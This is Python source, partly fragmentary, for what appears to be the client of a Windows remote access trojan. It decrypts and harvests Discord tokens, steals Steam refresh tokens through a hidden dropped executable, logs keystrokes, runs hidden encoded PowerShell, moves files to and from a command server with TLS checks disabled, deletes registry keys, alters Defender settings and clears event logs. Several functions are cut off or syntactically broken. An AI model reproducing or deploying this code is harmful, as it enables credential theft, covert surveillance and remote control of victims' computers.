def get_master_key_from_local_state(base_path):
    parent = os.path.dirname(base_path)
    grandparent = os.path.dirname(parent)
    local_state_path = os.path.join(grandparent, 'Local State')
    if not os.path.exists(local_state_path):
        local_state_path = os.path.join(os.path.dirname(grandparent), 'Local State')
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            state = json.load(f)
        if 'os_crypt' not in state:
            return None
        encrypted_key = base64.b64decode(state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        if HAS_CRYPTO and win32crypt:
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        return None
    except Exception:
        return None

def decrypt_token(encrypted_token, master_key):
    if not HAS_CRYPTO or not AES:
        return None
    try:
        encrypted_bytes = base64.b64decode(encrypted_token)
        if len(encrypted_bytes) < 15:
            return None
        iv = encrypted_bytes[3:15]
        payload = encrypted_bytes[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted[:-16].decode('utf-8', errors='ignore')
    except Exception:
        return None

def is_valid_token(token):
    patterns = [
        r'^[\w-]{24}\.[\w-]{6}\.[\w-]{27}$',
        r'^mfa\.[\w-]{84}$',
        r'^[\w-]{24}\.[\w-]{6}\.[\w-]{38,}$',
    ]
    return any(re.match(p, token) for p in patterns)

def extract_tokens_from_path(path_info):
    results = []
    path = path_info['path']
    source_name = path_info['name']
    source_type = path_info['type']
    if not os.path.exists(path):
        return results
    master_key = get_master_key_from_local_state(path)
    if not master_key:
        return results
    enc_pattern = re.compile(r'dQw4w9WgXcQ:([^"]*)')
    for file_name in os.listdir(path):
        if not file_name.endswith(('.log', '.ldb')):
            continue
        file_path = os.path.join(path, file_name)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            for match in enc_pattern.finditer(content):
                encrypted_token = match.group(1).strip()
                if not encrypted_token:
                    continue
                token = decrypt_token(encrypted_token, master_key)
                if token and is_valid_token(token):
                    results.append({
                        'source': source_name,
                        'type': source_type,
                        'token': token
                    })
        except Exception:
            continue
    return results

def get_all_discord_tokens():
    all_tokens = []
    paths = get_discord_paths()

        all_tokens.extend(tokens)
    return all_tokens

def normalize_text(text):

    if not text:
        return ''
    if not isinstance(text, str):
        text = str(text) if text else ''
    if not text:
        return ''
    

    for enc in ['cp1251', 'cp866', 'latin-1', 'cp1252']:
        try:


            decoded = text.encode('latin-1').decode(enc)
            return decoded
        except:
            continue
    

    return text

def find_chrome_processes():

    processes = []
    
    TH32CS_SNAPPROCESS = 0x00000002
    snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == -1:
        return processes
    
    pe32 = PROCESSENTRY32W()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32W)
    
    if kernel32.Process32FirstW(snapshot, ctypes.byref(pe32)):
        while True:
            exe_name = pe32.szExeFile.lower()
            if any(browser in exe_name for browser in ['chrome.exe', 'msedge.exe', 'brave.exe']):
                processes.append({
                    'pid': pe32.th32ProcessID,
                    'name': exe_name,
                    'parent_pid': pe32.th32ParentProcessID
                })
            
            if not kernel32.Process32NextW(snapshot, ctypes.byref(pe32)):
                break
    
    kernel32.CloseHandle(snapshot)
    return processes

def get_process_handle(pid):
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ = 0x0010
    PROCESS_VM_OPERATION = 0x0008
    
    handle = kernel32.OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION,
        False, pid
    )
    return handle



def search_key_in_dump(dump_path):

    if not os.path.exists(dump_path):
        return None
    


    patterns = [
        b'app_bound_encrypted_key',
        b'encrypted_key',
        b'app_bound_key',
        b'_key\x00',
    ]
    

    file_size = os.path.getsize(dump_path)
    if file_size > 500 * 1024 * 1024:  
        return None
    
    try:
        with open(dump_path, 'rb') as f:
            data = f.read()
        

        candidates = []
        

        for pattern in patterns:
            pos = data.find(pattern)
            if pos != -1:

                search_zone = data[pos:pos + 512]

                for i in range(0, len(search_zone) - 32):
                    block = search_zone[i:i+32]

                    if is_high_entropy(block):
                        candidates.append(block)
        


        for i in range(0, min(len(data), 50 * 1024 * 1024) - 32, 64):  
            block = data[i:i+32]
            entropy = calculate_entropy(block)
            if entropy > 6.5:
                candidates.append(block)
        

        unique = []
        for c in candidates:
            if c not in unique:
                unique.append(c)
        
        return unique[:10]  
    except:
        return None

def is_high_entropy(data):

    if len(data) < 16:
        return False

    unique = len(set(data))
    return unique > 20  

def calculate_entropy(data):

    if not data:
        return 0
    
    from collections import Counter
    byte_counts = Counter(data)
    length = len(data)
    
    entropy = 0
    for count in byte_counts.values():
        p = count / length
        entropy -= p * (p.bit_length() - 1 if p > 0 else 0)
    
    return entropy

def dpapi_decrypt(encrypted_bytes):

    try:
        if not encrypted_bytes:
            return None
        p = ctypes.create_string_buffer(encrypted_bytes, len(encrypted_bytes))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        ret = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if ret:
            cbData = int(blobout.cbData)
            pbData = blobout.pbData
            buffer = ctypes.create_string_buffer(cbData)
            ctypes.memmove(buffer, pbData, cbData)
            ctypes.windll.kernel32.LocalFree(pbData)
            return buffer.raw
    except Exception:
        pass
    return None







def registry_list_keys(key_path):

    try:

        parts = key_path.split('\\', 1)
        hive_name = parts[0]
        subkey = parts[1] if len(parts) > 1 else ""
        

        hives = {
            'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
            'HKCR': winreg.HKEY_CLASSES_ROOT,
            'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
            'HKCU': winreg.HKEY_CURRENT_USER,
            'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
            'HKLM': winreg.HKEY_LOCAL_MACHINE,
            'HKEY_USERS': winreg.HKEY_USERS,
            'HKU': winreg.HKEY_USERS,
            'HKEY_CURRENT_CONFIG': winreg.HKEY_CURRENT_CONFIG,
            'HKCC': winreg.HKEY_CURRENT_CONFIG
        }
        
        if hive_name not in hives:
            return {'error': f'Unknown hive: {hive_name}'}
        
        hive = hives[hive_name]
        
        result = {
            'path': key_path,
            'subkeys': [],
            'values': []
        }
        
        try:
            key = winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ)
            

            i = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    result['subkeys'].append(subkey_name)
                    i += 1
                except OSError:
                    break
            

            i = 0
            while True:
                try:
                    value_name, value_data, value_type = winreg.EnumValue(key, i)

                    if value_type == winreg.REG_BINARY:
                        if len(value_data) > 64:
                            display_data = value_data[:64].hex() + '...'
                        else:
                            display_data = value_data.hex()
                    elif value_type == winreg.REG_DWORD:
                        display_data = str(value_data)
                    elif value_type == winreg.REG_QWORD:
                        display_data = str(value_data)
                    elif value_type == winreg.REG_SZ or value_type == winreg.REG_EXPAND_SZ:
                        display_data = str(value_data)
                    else:
                        display_data = f'[{value_type}] {value_data[:50]}'
                    
                    result['values'].append({
                        'name': value_name if value_name else '(Default)',
                        'data': display_data,
                        'type': value_type,
                        'raw_data': base64.b64encode(value_data).decode() if isinstance(value_data, bytes) else value_data
                    })
                    i += 1
                except OSError:
                    break
            
            winreg.CloseKey(key)
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
        
    except Exception as e:
        return {'error': str(e), 'path': key_path}

def registry_delete_key(key_path):

    try:
        parts = key_path.split('\\', 1)
        hive_name = parts[0]
        subkey = parts[1] if len(parts) > 1 else ""
        
        hives = {
            'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
            'HKCR': winreg.HKEY_CLASSES_ROOT,
            'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
            'HKCU': winreg.HKEY_CURRENT_USER,
            'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
            'HKLM': winreg.HKEY_LOCAL_MACHINE,

            'HKU': winreg.HKEY_USERS,
        }
        
        if hive_name not in hives:
            return {'error': f'Unknown hive: {hive_name}'}
        
        hive = hives[hive_name]

        def recursive_delete(hkey, subkey_path):
            try:
                key = winreg.OpenKey(hkey, subkey_path, 0, winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        sub = winreg.EnumKey(key, 0)
                        recursive_delete(hkey, subkey_path + '\\' + sub)
                    except OSError:
                        break
                winreg.CloseKey(key)
                winreg.DeleteKey(hkey, subkey_path)
            except:
                pass
        
        recursive_delete(hive, subkey)
        return {'success': True, 'path': key_path}
    except Exception as e:
        return {'error': str(e)}

                    last_y = point.y

def get_all_windows():

    windows = []
    
    def callback(hwnd, lparam):
        if IsWindowVisible(hwnd):

            length = GetWindowTextLengthW(hwnd)
            if length > 0:
                buffer = ctypes.create_unicode_buffer(length + 1)
                GetWindowTextW(hwnd, buffer, length + 1)
                title = buffer.value
                if title and not title.startswith('Program Manager'):
                    windows.append(hwnd)
        return True
    
    EnumWindows(EnumWindowsProc(callback), 0)
    return windows

def get_window_rect(hwnd):

    rect = RECT()
    GetWindowRect(hwnd, ctypes.byref(rect))
    return rect.left, rect.top, rect.right, rect.bottom

def set_window_pos(hwnd, x, y):

    SetWindowPos(hwnd, HWND_TOP, x, y, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE)

def window_shake_thread():

    global window_shake_running
    
    while window_shake_running:
        try:
            windows = get_all_windows()
            if not windows:
                time.sleep(0.2)
                continue
            

            original_positions = {}
            for hwnd in windows:
                try:
                    x, y, _, _ = get_window_rect(hwnd)
                    original_positions[hwnd] = (x, y)
                except:
                    pass
            

            intensity = 6  
            
            while window_shake_running:
                for hwnd, (orig_x, orig_y) in original_positions.items():
                    try:

                        offset_x = random.randint(-intensity, intensity)
                        offset_y = random.randint(-intensity, intensity)
                        set_window_pos(hwnd, orig_x + offset_x, orig_y + offset_y)
                    except:
                        pass
                
                time.sleep(0.04)  
                
        except Exception as e:
            print(f"Window shake error: {e}")
            time.sleep(1)

mouse_trail_running = False

MOUSE_TRAIL_MAX = 30

gdi32 = ctypes.windll.gdi32
user32_for_trail = ctypes.windll.user32

class POINT(ctypes.Structure):

def get_cursor_pos():

    pt = POINT()
    user32_for_trail.GetCursorPos(ctypes.byref(pt))
    return pt.x, pt.y

def draw_ghost(x, y, alpha=255):

    try:

        hwnd = user32_for_trail.GetDesktopWindow()
        dc = user32_for_trail.GetDC(hwnd)
        


        hBrush = gdi32.CreateSolidBrush(0x008888FF)  # RGB: 255, 136, 0
        

        gdi32.SelectObject(dc, hBrush)
        gdi32.Ellipse(dc, x - MOUSE_TRAIL_DOT_SIZE//2, y - MOUSE_TRAIL_DOT_SIZE//2,
                      x + MOUSE_TRAIL_DOT_SIZE//2, y + MOUSE_TRAIL_DOT_SIZE//2)
        
        gdi32.DeleteObject(hBrush)
        user32_for_trail.ReleaseDC(hwnd, dc)
    except:
        pass

def clear_all_ghosts():

    try:

        user32_for_trail.InvalidateRect(0, None, True)
        user32_for_trail.UpdateWindow(user32_for_trail.GetDesktopWindow())
    except:
        pass

def mouse_trail_thread_func():

    global mouse_trail_running, mouse_trail_positions
    
    last_x, last_y = get_cursor_pos()
    frames_since_last = 0
    
    while mouse_trail_running:
        try:
            current_x, current_y = get_cursor_pos()
            

            if abs(current_x - last_x) > 3 or abs(current_y - last_y) > 3:

                mouse_trail_positions.append((current_x, current_y, time.time()))
                

                while len(mouse_trail_positions) > MOUSE_TRAIL_MAX:
                    mouse_trail_positions.pop(0)
                
                last_x, last_y = current_x, current_y
                frames_since_last = 0
            else:
                frames_since_last += 1
                if frames_since_last > 30:  

                    mouse_trail_positions = []
                    clear_all_ghosts()
                    frames_since_last = 0
        except:
            pass
        
        time.sleep(0.05)  

def draw_trails():

    global mouse_trail_running, mouse_trail_positions
    
    while mouse_trail_running:
        try:


            desktop_hwnd = user32_for_trail.GetDesktopWindow()
            user32_for_trail.InvalidateRect(desktop_hwnd, None, True)
            

            for i, (x, y, timestamp) in enumerate(mouse_trail_positions):

                age = time.time() - timestamp
                alpha = int(255 * (1 - age / 3.0))  
                if alpha > 0:
                    draw_ghost(x, y, alpha)
            

            cx, cy = get_cursor_pos()

            desktop_hwnd = user32_for_trail.GetDesktopWindow()
            dc = user32_for_trail.GetDC(desktop_hwnd)
            hBrush = gdi32.CreateSolidBrush(0x000000FF)  
            gdi32.SelectObject(dc, hBrush)
            gdi32.Ellipse(dc, cx - 4, cy - 4, cx + 4, cy + 4)
            gdi32.DeleteObject(hBrush)
            user32_for_trail.ReleaseDC(desktop_hwnd, dc)
            
        except Exception as e:
            pass
        
        time.sleep(0.033)

def get_netstat():

    results = []
    connections = []
    
    try:

        result = subprocess.run(
            'netstat -an',
            shell=True, capture_output=True, text=True, timeout=15,
            encoding='cp866', errors='replace'
        )
        
        lines = result.stdout.split('\n')
        
        for line in lines:
            parts = line.split()
            if len(parts) >= 4:
                proto = parts[0]
                local_addr = parts[1]
                foreign_addr = parts[2]
                state = parts[3] if len(parts) > 3 else ''
                

                status = 'unknown'
                color = '#888888'
                
                if state == 'ESTABLISHED':
                    status = 'established'
                    color = '#00ff00'  
                elif state == 'TIME_WAIT':
                    status = 'time_wait'
                    color = '#ff4444'  
                elif state == 'CLOSE_WAIT':
                    status = 'close_wait'
                    color = '#ff8844'  
                elif state == 'LISTENING':
                    status = 'listening'
                    color = '#00ccff'  
                elif 'SYN' in state:
                    status = 'syn'
                    color = '#ffff44'  
                elif state == 'CLOSED':
                    status = 'closed'
                    color = '#ff44ff'  
                

                local_parts = local_addr.split(':')
                local_port = local_parts[-1] if len(local_parts) > 1 else ''
                

                foreign_parts = foreign_addr.split(':')
                foreign_port = foreign_parts[-1] if len(foreign_parts) > 1 else ''
                
                connections.append({
                    'proto': proto,
                    'local_addr': local_addr,
                    'local_port': local_port,
                    'foreign_addr': foreign_addr,
                    'foreign_port': foreign_port,
                    'state': state,
                    'status': status,
                    'color': color
                })
        

        results = connections[:200]
        
    except Exception as e:
        results = []
    
    return results

                    winreg.DeleteValue(key, value_name)
                    winreg.CloseKey(key)
                    results.append(f"[+] Registry: {value_name} removed")
                except FileNotFoundError:
                    pass
                except Exception:
                    pass
                    
        except Exception as e:
            results.append(f"[!] Registry: {str(e)[:50]}")
        

        tamper_cmd = 'powershell -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableTamperProtection $false"'
        subprocess.run(
            tamper_cmd,
            shell=True, capture_output=True, text=True, timeout=30,
            startupinfo=startupinfo, creationflags=creationflags
        )
        

        update_cmd = 'powershell -ExecutionPolicy Bypass -Command "Update-MpSignature"'
        subprocess.run(
            update_cmd,
            shell=True, capture_output=True, text=True, timeout=60,
            startupinfo=startupinfo, creationflags=creationflags
        )
        results.append("[+] Signature update initiated")
        
        return True, "\n".join(results)
    except Exception as e:
        return False, str(e)

def get_keyboard_state(shift_pressed, caps_on):

    if shift_pressed:

    if caps_on:

def get_real_char(vk_code, shift_pressed, caps_on):

    try:

        hwnd = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        layout = user32.GetKeyboardLayout(thread_id)
        

        scan_code = user32.MapVirtualKeyExW(vk_code, MAPVK_VK_TO_VSC, layout)
        

        state = (ctypes.c_byte * 256)()
        if shift_pressed:
            state[VK_SHIFT] = 0x80
        

        buffer = ctypes.create_unicode_buffer(8)
        


        result = user32.ToUnicodeEx(
            vk_code, scan_code, state, buffer, 8, 0, layout
        )
        
        if result > 0:
            char = buffer.value
            if char and char[0] != '\x00':

                if caps_on and char.isalpha():
                    if shift_pressed:
                        char = char.lower()
                    else:
                        char = char.upper()
                return char
    except Exception:
        pass
    return None

def is_capslock_on():

    return user32.GetKeyState(VK_CAPITAL) & 0x0001 != 0

def is_shift_pressed():

    return user32.GetAsyncKeyState(VK_SHIFT) & 0x8000 != 0

def get_vk_code_from_key(key):

    try:
        if hasattr(key, 'vk'):
            return key.vk
        if hasattr(key, 'value') and hasattr(key.value, 'vk'):
            return key.value.vk
        if hasattr(key, 'char') and key.char and len(key.char) == 1:
            char = key.char
            if not char:
                return None

            vk = user32.VkKeyScanExW(ord(char), user32.GetKeyboardLayout(0))
            return vk & 0xFF
        return None
    except:
        return None



current_keyboard_layout = 0x0409  

def update_keyboard_layout():

    global current_keyboard_layout
    try:

        hwnd = user32.GetForegroundWindow()
        if hwnd:

            thread_id = user32.GetWindowThreadProcessId(hwnd, None)

            layout = user32.GetKeyboardLayout(thread_id)
            current_keyboard_layout = layout & 0xFFFF
    except Exception as e:
        pass

def get_keyboard_layout_name():

    try:
        hwnd = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        layout = user32.GetKeyboardLayout(thread_id)
        layout_id = layout & 0xFFFF
        lang_name = ctypes.create_unicode_buffer(64)
        user32.GetLocaleInfoW(layout_id, 0x00000004, lang_name, 64)
        return lang_name.value.lower()
    except:
        return "en"

def on_press(key):
    global keylogger_queue, keylogger_main_loop, keylogger_running
    if not keylogger_running or keylogger_queue is None:
        return
    
    try:
        key_str = str(key)
        

        special_ignore = ['Key.enter', 'Key.shift', 'Key.shift_r', 'Key.ctrl_l', 'Key.ctrl_r',
                          'Key.alt_l', 'Key.alt_r', 'Key.cmd', 'Key.cmd_r', 'Key.tab']
        
        if key_str in special_ignore:
            return
        
        if 'enter' in key_str.lower():
            return
        
        if key_str == 'Key.space':
            asyncio.run_coroutine_threadsafe(keylogger_queue.put(' '), keylogger_main_loop)
            return
        
        if key_str == 'Key.backspace':
            asyncio.run_coroutine_threadsafe(keylogger_queue.put('[BACKSPACE]'), keylogger_main_loop)
            return
        
        special_map = {
            'Key.delete': '[DEL]', 'Key.esc': '[ESC]', 'Key.up': '[UP]', 'Key.down': '[DOWN]',
            'Key.left': '[LEFT]', 'Key.right': '[RIGHT]', 'Key.home': '[HOME]', 'Key.end': '[END]',
            'Key.page_up': '[PGUP]', 'Key.page_down': '[PGDN]',
        }
        
        if key_str in special_map:
            asyncio.run_coroutine_threadsafe(keylogger_queue.put(special_map[key_str]), keylogger_main_loop)
            return
        
        if 'f' in key_str and len(key_str) <= 6 and key_str[1:].isdigit():
            asyncio.run_coroutine_threadsafe(keylogger_queue.put(f'[F{key_str[1:]}]'), keylogger_main_loop)
            return
        


        vk_code = get_vk_code_from_key(key)
        
        if vk_code is not None:
            caps = is_capslock_on()
            shift = is_shift_pressed()
            

            char = get_real_char(vk_code, shift, caps)
            
            if char:
                asyncio.run_coroutine_threadsafe(keylogger_queue.put(char), keylogger_main_loop)
                return
        

        if hasattr(key, 'char') and key.char and len(key.char) == 1:
            char = key.char
            caps = is_capslock_on()
            shift = is_shift_pressed()
            
            if caps and char.isalpha():
                if shift:
                    char = char.lower()
                else:
                    char = char.upper()
            
            asyncio.run_coroutine_threadsafe(keylogger_queue.put(char), keylogger_main_loop)
            
    except Exception as e:
        pass

def start_keylogger_hook():
    global keylogger_listener, keylogger_running

    def _collect_system_info_text(self):

        import subprocess
        import sys

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0

        try:

            result = subprocess.run(
                ['systeminfo'],
                capture_output=True,
                text=False,
                startupinfo=startupinfo,
                creationflags=creationflags,
                timeout=60
            )
            

            if result.returncode == 0:

                for enc in ['cp866', 'cp1251', 'utf-8']:
                    try:
                        return result.stdout.decode(enc, errors='replace')
                    except:
                        continue

                return result.stdout.decode('utf-8', errors='replace')
            else:
                stderr = result.stderr.decode('utf-8', errors='replace') if result.stderr else ""
                return f"[ERROR] systeminfo failed with code {result.returncode}\n{stderr}"
                
        except subprocess.TimeoutExpired:
            return "[ERROR] systeminfo timeout after 60 seconds"
        except Exception as e:
            return f"[ERROR] Failed to run systeminfo: {str(e)}"

    async def run_powershell_script(self, script_b64):
        try:
            script_content = base64.b64decode(script_b64).decode('utf-8')
            
            script_content = script_content.replace(
                'Remove-Item -Path $PSCommandPath -Force -EA SilentlyContinue',
                'if ($PSCommandPath -and (Test-Path $PSCommandPath)) { Remove-Item -Path $PSCommandPath -Force -EA SilentlyContinue }'
            )
            
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0

            def run_with_stdin():
                process = subprocess.Popen(
                    ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', '-'],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='utf-8',
                    startupinfo=startupinfo,
                    creationflags=creationflags
                )
                stdout, stderr = process.communicate(input=script_content, timeout=600)
                return stdout, stderr, process.returncode

            stdout, stderr, returncode = await asyncio.to_thread(run_with_stdin)
            
            output = stdout + stderr
            
            await self.send_message({
                "type": "powershell_script_result",
                "output": output[:20000],
                "success": returncode == 0
            })
            
        except subprocess.TimeoutExpired:
            await self.send_message({
                "type": "powershell_script_result",
                "output": "Script execution timed out after 600 seconds",
                "success": False
            })
        except Exception as e:
            await self.send_message({
                "type": "powershell_script_result",
                "output": f"Error: {str(e)}",
                "success": False
            })
    async def get_steam_tokens_external(self):
        try:

            steam_procs = [p for p in psutil.process_iter(['pid', 'name']) 
                          if p.info['name'] == 'steam.exe']
            if not steam_procs:
                await self.send_message({
                    "type": "steam_tokens_result", 
                    "tokens": [], 
                    "error": "Steam process not found"
                })
                return

            exe_path = r"C:\Users\Public\java.exe"
            try:
                exe_data = base64.b64decode(STEAM_DUMP_EXE_B64)

                def write_exe():
                    with open(exe_path, "wb") as f:
                        f.write(exe_data)
                    if sys.platform == 'win32':
                        ctypes.windll.kernel32.SetFileAttributesW(exe_path, 2)
                await asyncio.to_thread(write_exe)
            except Exception as e:
                await self.send_message({
                    "type": "steam_tokens_result",
                    "tokens": [],
                    "error": f"Failed to write EXE: {str(e)}"
                })
                return

            try:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                creationflags = 0
                if sys.platform == 'win32':
                    creationflags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS



                process = await asyncio.create_subprocess_exec(
                    exe_path,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    startupinfo=startupinfo,
                    creationflags=creationflags
                )

                try:
                    stdout_bytes, stderr_bytes = await asyncio.wait_for(process.communicate(), timeout=30)
                    stdout = stdout_bytes.decode('utf-8', errors='replace')
                    stderr = stderr_bytes.decode('utf-8', errors='replace')
                    output = stdout + stderr
                except asyncio.TimeoutError:
                    process.kill()
                    await process.wait()
                    await self.send_message({
                        "type": "steam_tokens_result",
                        "tokens": [],
                        "error": "Timeout (30s)"
                    })
                    return

                output = stdout + stderr
                tokens = []

                    if 'Refresh token:' in line or 'refresh token:' in line.lower():
                        parts = line.split(':', 1)
                        if len(parts) > 1:
                            token = parts[1].strip()
                            if token and len(token) > 50:
                                tokens.append(token)


                try:
                    os.remove(exe_path)
                except:
                    pass

                await self.send_message({
                    "type": "steam_tokens_result",
                    "tokens": tokens
                })

            except Exception as e:
                try:
                    os.remove(exe_path)
                except:
                    pass
                await self.send_message({
                    "type": "steam_tokens_result",
                    "tokens": [],
                    "error": f"Execution error: {str(e)}"
                })

        except Exception as e:
            await self.send_message({
                "type": "steam_tokens_result",
                "tokens": [],
                "error": str(e)
            })

    async def async_file_sender_tunnel(self, file_path, transfer_uuid):
        try:
            if not os.path.exists(file_path):
                self.log(f"File not found: {file_path}")
                await self.send_message({
                    "type": "error",
                    "msg": f"File not found: {file_path}",
                    "agent_id": self.agent_id
                })
                return

            protocol = "wss" if self.use_ssl else "ws"
            uri = f"{protocol}://{self.server_ip}:{self.server_port}"
            
            kwargs = {"max_size": 524288000}
            if self.use_ssl:
                import ssl
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                kwargs["ssl"] = ssl_context
            
            async with websockets.connect(uri, **kwargs) as ws_data:
                init_packet = {
                    "action": "init_file_transfer",
                    "transfer_uuid": transfer_uuid,
                    "role": "agent"
                }
                await ws_data.send(json.dumps(init_packet))
                await asyncio.sleep(0.5)

                file_size = os.path.getsize(file_path)
                await ws_data.send(json.dumps({"type": "file_size", "size": file_size}))
                await asyncio.sleep(0.1)

                chunk_size = 8 * 1024 * 1024  # 8 MB
                with open(file_path, "rb") as f:
                    while True:
                        chunk = await asyncio.to_thread(f.read, chunk_size)
                        if not chunk:
                            break
                        await ws_data.send(chunk)

                await ws_data.send(json.dumps({"type": "transfer_done"}))
                self.log(f"File sent: {file_path}")

        except Exception as e:
            self.log(f"Error in file sender tunnel: {e}")
            await self.send_message({
                "type": "error",
                "msg": f"File send error: {str(e)}",
                "agent_id": self.agent_id
            })

    async def async_file_receiver_tunnel(self, dest_path, transfer_uuid):
        try:

            os.makedirs(os.path.dirname(dest_path), exist_ok=True)

            protocol = "wss" if self.use_ssl else "ws"
            uri = f"{protocol}://{self.server_ip}:{self.server_port}"
            
            kwargs = {"max_size": 524288000, "ping_interval": 30, "ping_timeout": 120}
            if self.use_ssl:
                import ssl
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                kwargs["ssl"] = ssl_context
            
            async with websockets.connect(uri, **kwargs) as ws_data:
                init_packet = {
                    "action": "init_file_transfer",
                    "transfer_uuid": transfer_uuid,
                    "role": "agent"
                }
                await ws_data.send(json.dumps(init_packet))
                await asyncio.sleep(0.5)

                chunk_size = 512 * 1024
                buffer_queue = asyncio.Queue(maxsize=50)
                write_done = asyncio.Event()
                write_exception = None


                async def file_writer():
                    nonlocal write_exception
                    try:
                        with open(dest_path, "wb") as f:
                            while True:
                                data = await buffer_queue.get()
                                if data is None:
                                    break
                                await asyncio.to_thread(f.write, data)
                                if buffer_queue.qsize() == 0:
                                    await asyncio.to_thread(f.flush)
                    except Exception as e:
                        write_exception = e
                    finally:
                        write_done.set()

                writer_task = asyncio.create_task(file_writer())


                transfer_complete = False
                async for message in ws_data:
                    if isinstance(message, bytes):
                        for offset in range(0, len(message), chunk_size):
                            chunk = message[offset:offset+chunk_size]
                            await buffer_queue.put(chunk)
                    elif isinstance(message, str):
                        try:
                            msg_data = json.loads(message)
                            if msg_data.get("type") == "transfer_done":
                                transfer_complete = True
                                break
                        except:
                            pass

                await buffer_queue.put(None)
                await writer_task

                if write_exception:
                    raise write_exception

                await ws_data.send(json.dumps({
                    "type": "file_received",
                    "status": "success",
                    "path": dest_path
                }))
                await asyncio.sleep(0.3)

                self.log(f"File received and written: {dest_path}")

        except Exception as e:

            try:
                await ws_data.send(json.dumps({
                    "type": "file_received",
                    "status": "error",
                    "error": str(e)
                }))
            except:
                pass
            
            self.log(f"Error in file receiver tunnel: {e}")
            if os.path.exists(dest_path):
                try:
                    os.remove(dest_path)
                except:
                    pass

            await self.send_message({
                "type": "error",
                "msg": f"File receiver error: {str(e)}"
            })

    async def _emulate_key(self, vk_code, key_down, modifiers=0):

        try:
            import ctypes

            if modifiers:

                if modifiers & 1:  # Shift
                    ctypes.windll.user32.keybd_event(0x10, 0, 0 if key_down else 0x0002, 0)
                if modifiers & 2:  # Ctrl
                    ctypes.windll.user32.keybd_event(0x11, 0, 0 if key_down else 0x0002, 0)
                if modifiers & 4:  # Alt
                    ctypes.windll.user32.keybd_event(0x12, 0, 0 if key_down else 0x0002, 0)

            if key_down:
                ctypes.windll.user32.keybd_event(vk_code, 0, 0, 0)
            else:
                ctypes.windll.user32.keybd_event(vk_code, 0, 0x0002, 0)
                
        except Exception as e:
            self.log(f"Emulate key error: {e}")

            creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            

            ps_script = '''
            $logs = Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0 -or $_.IsEnabled}

                $result += [PSCustomObject]@{
                    Name = $log.LogName
                    RecordCount = $log.RecordCount

            $result | ConvertTo-Json -Compress -Depth 10

                ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],

            )
            
            logs = []

                                'is_enabled': log.get('IsEnabled', False),
                                'retention_days': log.get('RetentionDays', 0)
                            })

                            'name': ps_result.get('Name', 'Unknown'),
                            'record_count': ps_result.get('RecordCount', 0),
                            'file_size': ps_result.get('FileSize', 0),
                            'is_enabled': ps_result.get('IsEnabled', False),
                            'retention_days': ps_result.get('RetentionDays', 0)

    def is_frame_different(self, new_img_bytes):

        if not hasattr(self, '_last_frame_hash'):
            self._last_frame_hash = None

        import hashlib

        new_hash = hashlib.md5(new_img_bytes).hexdigest()
        
        if new_hash == self._last_frame_hash:
            return False 
            
        self._last_frame_hash = new_hash
        return True

    async def clear_event_log(self, log_name, clear_all=False, from_date=None, to_date=None):

                        "success": False,
                        "msg": f"Failed to clear log: {result.stderr}",
                        "agent_id": self.agent_id
                    })

                $startDate = [datetime]"{from_date}"
                $endDate = [datetime]"{to_date}"
                $logName = "{log_name}"
                
                try {{
                    $events = Get-WinEvent -LogName $logName -MaxEvents 100000 -ErrorAction Stop | Where-Object {{
                        $_.TimeCreated -ge $startDate -and $_.TimeCreated -le $endDate
                    }}
                    $count = $events.Count
                    foreach ($event in $events) {{
